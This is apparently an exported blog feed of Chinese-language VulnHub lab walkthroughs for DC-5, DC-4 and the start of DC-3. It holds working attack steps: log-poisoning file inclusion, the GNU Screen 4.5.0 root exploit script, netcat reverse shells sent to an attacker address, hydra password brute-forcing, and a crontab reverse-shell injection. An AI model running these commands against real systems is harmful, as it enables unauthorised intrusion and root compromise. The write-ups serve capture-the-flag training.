class="token number">2020</span> <span class="token number">17</span>:33:49 GMTContent-Type: text/htmlContent-Length: <span class="token number">172</span>Connection: close<span class="token comment"># 返回信息:</span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token number">400</span> Bad Request<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body <span class="token assign-left variable">bgcolor</span><span class="token operator">=</span><span class="token string">"white"</span><span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token number">400</span> Bad Request<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>hr<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span>nginx/1.6.<span class="token operator"><span class="token file-descriptor important">2</span>&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>然后我们再访问:<a href="http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log">http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log</a></p></li><li><p>这时候会一直加载出不来页面就说明成功了</p></li><li><p>服务器就会开启监听 <code>13123</code> 端口 ,直接用<code>nc 192.168.0.149 13123</code> 就可以得到shell 了</p></li><li><p>得到shell了 再让他来个标准控制台</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>得到标准控制台之后 就要想办法提权了</p></li><li><p>先看看用户目录,发现只有一个<code>dc</code> 用户有用户目录</p></li><li><p>里面啥也没有 再翻翻 <code>/tmp</code> 文件夹 也没</p></li><li><p>先看看suid 的提权</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>找出suid的文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/su/bin/mount/bin/umount/bin/screen-4.5.0/usr/bin/gpasswd/usr/bin/procmail/usr/bin/passwd/usr/bin/chfn/usr/bin/newgrp/usr/bin/chsh/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/sbin/exim4/sbin/mount.nfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>百度才知道 :<code>screen-4.5.0</code> 有一个提权漏洞</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali<span class="token comment"># searchsploit screen 4.5.0</span>GNU Screen <span class="token number">4.5</span>.0 - Local Privilege Escalation  <span class="token operator">|</span> exploits/linux/local/41154.sh                                                                        GNU Screen <span class="token number">4.5</span>.0 - Local Privilege Escalation <span class="token punctuation">(</span>PoC<span class="token punctuation">)</span>  <span class="token operator">|</span> exploits/linux/local/41152.txt <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>找到两个文件 直接用那个sh文件吧</p></li><li><p>可以到自己的kali 运行一下,会产生两个文件并获得<code>rootshell</code></p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-rwxr-xr-x <span class="token number">1</span> root root  <span class="token number">1152</span> <span class="token number">4</span>月  <span class="token number">26</span> <span class="token number">15</span>:57 <span class="token number">41154</span>.sh-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">16136</span> <span class="token number">4</span>月  <span class="token number">26</span> <span class="token number">15</span>:57 libhax.so-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">16824</span> <span class="token number">4</span>月  <span class="token number">26</span> <span class="token number">15</span>:57 rootshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><p>然后我们用kali写一个sh文件: <code>vim /tmp/run.sh</code></p></li><li><p>内容是:</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc<span class="token builtin class-name">umask</span> 000 <span class="token comment"># because</span><span class="token function">screen</span> <span class="token parameter variable">-D</span> <span class="token parameter variable">-m</span> <span class="token parameter variable">-L</span> ld.so.preload <span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span>  <span class="token string">"<span class="token entity" title="\x0a">\x0a</span>/tmp/libhax.so"</span> <span class="token comment"># newline needed</span><span class="token builtin class-name">echo</span> <span class="token string">"[+] Triggering..."</span><span class="token function">screen</span> <span class="token parameter variable">-ls</span> <span class="token comment"># screen itself is setuid, so...</span>/tmp/rootshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>我们用 scp 拷贝到靶机里去</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> root@192.168.0.21:/tmp/libhax.so /tmp<span class="token comment">#然后输入kali的密码</span><span class="token function">scp</span> root@192.168.0.21:/tmp/rootshell /tmp<span class="token comment">#然后输入kali的密码</span><span class="token function">scp</span> root@192.168.0.21:/tmp/run.sh /tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>然后依次执行下面的语句或者写成shell脚本</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc<span class="token builtin class-name">umask</span> 000 <span class="token comment"># because</span><span class="token function">screen</span> <span class="token parameter variable">-D</span> <span class="token parameter variable">-m</span> <span class="token parameter variable">-L</span> ld.so.preload <span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span>  <span class="token string">"<span class="token entity" title="\x0a">\x0a</span>/tmp/libhax.so"</span> <span class="token comment"># newline needed</span><span class="token builtin class-name">echo</span> <span class="token string">"[+] Triggering..."</span><span class="token function">screen</span> <span class="token parameter variable">-ls</span> <span class="token comment"># screen itself is setuid, so...</span>/tmp/rootshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>给他个执行权限并运行 <code>cd /tmp;chmod +x run.sh;./run.sh</code></p></li><li><p>就可以得到一个<code>rootshell</code>了:</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@dc-5:~$ <span class="token builtin class-name">cd</span> /tmp<span class="token punctuation">;</span><span class="token function">chmod</span> +x run.sh<span class="token punctuation">;</span>./run.sh<span class="token builtin class-name">cd</span> /tmp<span class="token punctuation">;</span><span class="token function">chmod</span> +x run.sh<span class="token punctuation">;</span>./run.sh<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Triggering<span class="token punctuation">..</span>.' from /etc/ld.so.preload cannot be preloaded <span class="token punctuation">(</span>cannot <span class="token function">open</span> shared object <span class="token function">file</span><span class="token punctuation">)</span>: ignored.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> done<span class="token operator">!</span><span class="token comment"># id</span><span class="token function">id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,33<span class="token punctuation">(</span>www-data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>flag 就在<code>/root</code>下的<code>thisistheflag.txt</code>文件</li></ul>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-4靶机渗透</title>
      <link href="/dc-4/"/>
      <url>/dc-4/</url>
      
        <content type="html"><![CDATA[<h1 id="DC4-靶机渗透"><a href="#DC4-靶机渗透" class="headerlink" title="DC4 靶机渗透"></a>DC4 靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul><li>主机发现</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>找到IP地址： <code>192.168.0.123</code></p></li><li><p>扫描端口</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~/workspace<span class="token comment"># nmap -sS -A -p- 192.168.0.123</span>Starting Nmap <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2020</span>-05-03 <span class="token number">14</span>:49 CSTNmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.0.123Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00025s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65533</span> closed portsPORT   STATE SERVICE VERSION<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.4p1 Debian <span class="token number">10</span>+deb9u6 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey:<span class="token operator">|</span>   <span class="token number">2048</span> 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span><span class="token operator">|</span>   <span class="token number">256</span> e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token operator">|</span>_  <span class="token number">256</span> fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span><span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.15</span>.10<span class="token operator">|</span>_http-server-header: nginx/1.15.10<span class="token operator">|</span>_http-title: System ToolsMAC Address: 00:0C:29:84:3B:AB <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>Network Distance: <span class="token number">1</span> hopService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>看看80端口</p></li><li><p>只有一个登录框</p></li><li><p>抓个包试试</p></li><li><p>先试试有没有sql注入</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://192.168.0.123 <span class="token parameter variable">--data</span> <span class="token string">"username=admin&amp;password=1122"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>并没发现sql注入</p></li><li><p>扫描下目录</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.0.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>还是没啥啊~</p></li><li><p>只有爆破这条路了？</p></li><li><p>使用了BurpSuite爆破</p></li><li><p>得到账号密码：<code>admin : happy</code></p></li><li><p>然后登陆</p></li><li><p>是一个执行命令的~</p></li><li><p>但是只有一些简单的命令</p></li><li><p>然后抓一个包，发现并没有对命令过滤。直接就提交了。</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /command.php HTTP/1.1Host: <span class="token number">192.168</span>.0.123User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:75.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/75.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/webp,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,zh-TW<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,zh-HK<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.2</span>Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: <span class="token number">22</span>Origin: http://192.168.0.123Connection: closeReferer: http://192.168.0.123/command.phpCookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>jj07s1dhaif60k528ttntgbfb3Upgrade-Insecure-Requests: <span class="token number">1</span><span class="token assign-left variable">radio</span><span class="token operator">=</span>ls+-l<span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>Run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>我们可以修改radio的数据改成一个反弹shell的就可以</p></li><li><p>我们先监听8899端口 <code> nc -lvp 8899</code></p></li><li><p>然后把radio的数据改成：<code>nc 192.168.0.21 8899 -e /bin/bash</code></p></li><li><p>拿到shell就看到有有三个用户: <code>charles  jim  sam</code></p></li><li><p>而且只有jim用户目录下有些东西：<code>backups  mbox  test.sh</code></p></li><li><p>但是mbox无法查看</p></li><li><p><code>test.sh</code>也不知道有啥用</p></li><li><p>在jim&#x2F;backups目录下看到一个old-password.bak，于是就拿来爆破jim的ssh密码</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> jim <span class="token parameter variable">-P</span> old-passwords.bak ssh://192.168.0.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>得到密码： <code>host: 192.168.0.123   login: jim   password: jibril04</code></p></li><li><p>然后就是登录jim用户了 尝试进一步提权</p></li><li><p>这时候可以查看mbox了</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">jim@dc-4:~$ <span class="token function">cat</span> mboxFrom root@dc-4 Sat Apr 06 <span class="token number">20</span>:20:04 <span class="token number">2019</span>Return-path: <span class="token operator">&lt;</span>root@dc-<span class="token operator"><span class="token file-descriptor important">4</span>></span>Envelope-to: jim@dc-4Delivery-date: Sat, 06 Apr <span class="token number">2019</span> <span class="token number">20</span>:20:04 +1000Received: from root by dc-4 with <span class="token builtin class-name">local</span> <span class="token punctuation">(</span>Exim <span class="token number">4.89</span><span class="token punctuation">)</span><span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>root@dc-<span class="token operator"><span class="token file-descriptor important">4</span>></span><span class="token punctuation">)</span><span class="token function">id</span> 1hCiQe-0000gc-EC<span class="token keyword">for</span> jim@dc-4<span class="token punctuation">;</span> Sat, 06 Apr <span class="token number">2019</span> <span class="token number">20</span>:20:04 +1000To: jim@dc-4Subject: TestMIME-Version: <span class="token number">1.0</span>Content-Type: text/plain<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>Content-Transfer-Encoding: 8bitMessage-Id: <span class="token operator">&lt;</span>E1hCiQe-0000gc-EC@dc-<span class="token operator"><span class="token file-descriptor important">4</span>></span>From: root <span class="token operator">&lt;</span>root@dc-<span class="token operator"><span class="token file-descriptor important">4</span>></span>Date: Sat, 06 Apr <span class="token number">2019</span> <span class="token number">20</span>:20:04 +1000Status: ROThis is a test.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>是邮件。一般邮件保存在<code>/var/mail</code>目录里面</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">jim@dc-4:/var/mail$ <span class="token function">cat</span> jimFrom charles@dc-4 Sat Apr 06 <span class="token number">21</span>:15:46 <span class="token number">2019</span>Return-path: <span class="token operator">&lt;</span>charles@dc-<span class="token operator"><span class="token file-descriptor important">4</span>></span>Envelope-to: jim@dc-4Delivery-date: Sat, 06 Apr <span class="token number">2019</span> <span class="token number">21</span>:15:46 +1000Received: from charles by dc-4 with <span class="token builtin class-name">local</span> <span class="token punctuation">(</span>Exim <span class="token number">4.89</span><span class="token punctuation">)</span><span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>charles@dc-<span class="token operator"><span class="token file-descriptor important">4</span>></span><span class="token punctuation">)</span><span class="token function">id</span> 1hCjIX-0000kO-Qt<span class="token keyword">for</span> jim@dc-4<span class="token punctuation">;</span> Sat, 06 Apr <span class="token number">2019</span> <span class="token number">21</span>:15:45 +1000To: jim@dc-4Subject: HolidaysMIME-Version: <span class="token number">1.0</span>Content-Type: text/plain<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>Content-Transfer-Encoding: 8bitMessage-Id: <span class="token operator">&lt;</span>E1hCjIX-0000kO-Qt@dc-<span class="token operator"><span class="token file-descriptor important">4</span>></span>From: Charles <span class="token operator">&lt;</span>charles@dc-<span class="token operator"><span class="token file-descriptor important">4</span>></span>Date: Sat, 06 Apr <span class="token number">2019</span> <span class="token number">21</span>:15:45 +1000Status: OHi Jim,I'm heading off on holidays at the end of today, so the boss asked me to give you my password just <span class="token keyword">in</span> <span class="token keyword">case</span> anything goes wrong.Password is:  ^xHhA<span class="token operator">&amp;</span>hvim0ySee ya,Charles<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>发现了<code>charles</code>的密码：<code>^xHhA&amp;hvim0y</code></p></li><li><p>我们先登录到<code>charles</code></p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> charles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>登录之后sudo -l 发现</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">charles@dc-4:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>Matching Defaults entries <span class="token keyword">for</span> charles on dc-4:env_reset, mail_badpass,<span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/binUser charles may run the following commands on dc-4:<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/teehee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>利用<code>/usr/bin/teehee</code> 写入计划任务提权</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /usr/bin/teehee <span class="token parameter variable">-a</span> /etc/crontab */1 * * * * <span class="token function">nc</span> <span class="token number">192.168</span>.0.21 <span class="token number">8899</span> <span class="token parameter variable">-e</span> /bin/bash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>kali 监听8899端口，等1分钟</p></li><li><p>就可以获得root shell了</p></li></ul><p><img src="/../static/dc-4/image-20200503161102432.png" alt="flag"></p><h2 id="2-重要数据"><a href="#2-重要数据" class="headerlink" title="2. 重要数据"></a>2. 重要数据</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. 网站账号密码：</span>admin <span class="token builtin class-name">:</span> happy<span class="token comment"># 2. jim的ssh密码</span>jibril04<span class="token comment"># 3. charles的ssh密码</span>^xHhA<span class="token operator">&amp;</span>hvim0y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3靶机渗透</title>
      <link href="/dc-3/"/>
      <url>/dc-3/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-3靶机渗透"><a href="#DC-3靶机渗透" class="headerlink" title="DC-3靶机渗透"></a>DC-3靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul><li>先发现主机</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># arp-scan 192.168.0.1/24</span>Interface: eth0, type: EN10MB, MAC: 00:0c:29:f9:47:54, IPv4: <span class="token number">192.168</span>.0.21WARNING: <span class="token function">host</span> part of <span class="token number">192.168</span>.0.1/24 is non-zeroStarting arp-scan <span class="token number">1.9</span>.7 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span><span class="token number">192.168</span>.0.1     04:95:e6:0f:a2:10       Tenda Technology Co.,Ltd.Dongguan branch<span class="token number">192.168</span>.0.22    00:0c:29:a9:c5:31       VMware, Inc.<span class="token number">192.168</span>.0.109   dc:8b:28:00:fa:32       Intel Corporate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>得到ip: <code>192.168.0.22 </code></p></li><li><p>探测端口:</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># nmap -sT -v -p- 192.168.0.22</span>Starting Nmap <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2020</span>-04-29 <span class="token number">15</span>:41 CSTInitiating ARP Ping Scan at <span class="token number">15</span>:41Scanning <span class="token number">192.168</span>.0.22 <span class="token punctuation">[</span><span class="token number">1</span> port<span class="token punctuation">]</span>Completed ARP Ping Scan at <span class="token number">15</span>:41, <span class="token number">0</span>.04s elapsed <span class="token punctuation">(</span><span class="token number">1</span> total hosts<span class="token punctuation">)</span>Initiating Parallel DNS resolution of <span class="token number">1</span> host. at <span class="token number">15</span>:41Completed Parallel DNS resolution of <span class="token number">1</span> host. at <span class="token number">15</span>:41, <span class="token number">0</span>.03s elapsedInitiating Connect Scan at <span class="token number">15</span>:41Scanning <span class="token number">192.168</span>.0.22 <span class="token punctuation">[</span><span class="token number">65535</span> ports<span class="token punctuation">]</span>Discovered <span class="token function">open</span> port <span class="token number">80</span>/tcp on <span class="token number">192.168</span>.0.22Completed Connect Scan at <span class="token number">15</span>:41, <span class="token number">1</span>.90s elapsed <span class="token punctuation">(</span><span class="token number">65535</span> total ports<span class="token punctuation">)</span>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.0.22Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00020s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65534</span> closed portsPORT   STATE SERVICE<span class="token number">80</span>/tcp <span class="token function">open</span>  httpMAC Address: 00:0C:29:A9:C5:31 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Read data files from: /usr/bin/<span class="token punctuation">..</span>/share/nmapNmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">2.18</span> secondsRaw packets sent: <span class="token number">1</span> <span class="token punctuation">(</span>28B<span class="token punctuation">)</span> <span class="token operator">|</span> Rcvd: <span class="token number">1</span> <span class="token punctuation">(</span>28B<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>只有80端口</p></li><li><p>现进去看看</p></li></ul><blockquote><p>  <strong>Welcome to DC-3.</strong><br>  This time, there is only one flag, one entry point and no clues.<br>  To get the flag, you’ll obviously have to gain root privileges.<br>  How you get to be root is up to you - and, obviously, the system.<br>  Good luck - and I hope you enjoy this little challenge. :-)<br>  <strong>欢迎来到DC-3。</strong><br>  这次，只有一个flag，一个入口点，没有任何线索。<br>  要获得标志，显然必须获得root权限。<br>  你是如何成为根的取决于你-很明显，还有系统。<br>  祝你好运-我希望你喜欢这个小挑战。:-)</p></blockquote><ul><li><p>只有一个入口点？</p></li><li><p>页面也有一个登陆框</p></li><li><p>八成是突破这个登录框了</p></li><li><p>想看看网站的信息：</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># whatweb http://192.168.0.22/</span>http://192.168.0.22/ <span class="token punctuation">[</span><span class="token number">200</span> OK<span class="token punctuation">]</span> Apache<span class="token punctuation">[</span><span class="token number">2.4</span>.18<span class="token punctuation">]</span>, Cookies<span class="token punctuation">[</span>460ada11b31d3c5e5ca6e58fd5d3de27<span class="token punctuation">]</span>, Country<span class="token punctuation">[</span>RESERVED<span class="token punctuation">]</span><span class="token punctuation">[</span>ZZ<span class="token punctuation">]</span>, HTML5, HTTPServer<span class="token punctuation">[</span>Ubuntu Linux<span class="token punctuation">]</span><span class="token punctuation">[</span>Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">]</span>, HttpOnly<span class="token punctuation">[</span>460ada11b31d3c5e5ca6e58fd5d3de27<span class="token punctuation">]</span>, IP<span class="token punctuation">[</span><span class="token number">192.168</span>.0.22<span class="token punctuation">]</span>, JQuery, MetaGenerator<span class="token punctuation">[</span>Joomla<span class="token operator">!</span> - Open Source Content Management<span class="token punctuation">]</span>, PasswordField<span class="token punctuation">[</span>password<span class="token punctuation">]</span>, Script<span class="token punctuation">[</span>application/json<span class="token punctuation">]</span>, Title<span class="token punctuation">[</span>Home<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>发现是Joomla框架</p></li><li><p>先扫描一下框架版本</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">joomscan <span class="token parameter variable">-u</span> http://192.168.0.22/<span class="token punctuation">[</span>+<span class="token punctuation">]</span> FireWall Detector<span class="token punctuation">[</span>++<span class="token punctuation">]</span> Firewall not detected<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Detecting Joomla Version<span class="token punctuation">[</span>++<span class="token punctuation">]</span> Joomla <span class="token number">3.7</span>.0<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Core Joomla Vulnerability<span class="token punctuation">[</span>++<span class="token punctuation">]</span> Target Joomla core is not vulnerable<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking Directory Listing<span class="token punctuation">[</span>++<span class="token punctuation">]</span> directory has directory listing <span class="token builtin class-name">:</span>http://192.168.0.22/administrator/componentshttp://192.168.0.22/administrator/moduleshttp://192.168.0.22/administrator/templateshttp://192.168.0.22/images/banners<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking apache info/status files<span class="token punctuation">[</span>++<span class="token punctuation">]</span> Readable info/status files are not found<span class="token punctuation">[</span>+<span class="token punctuation">]</span> admin finder<span class="token punctuation">[</span>++<span class="token punctuation">]</span> Admin page <span class="token builtin class-name">:</span> http://192.168.0.22/administrator/<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking robots.txt existing<span class="token punctuation">[</span>++<span class="token punctuation">]</span> robots.txt is not found<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finding common backup files name<span class="token punctuation">[</span>++<span class="token punctuation">]</span> Backup files are not found<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finding common log files name<span class="token punctuation">[</span>++<span class="token punctuation">]</span> error log is not found<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking sensitive config.php.x <span class="token function">file</span><span class="token punctuation">[</span>++<span class="token punctuation">]</span> Readable config files are not 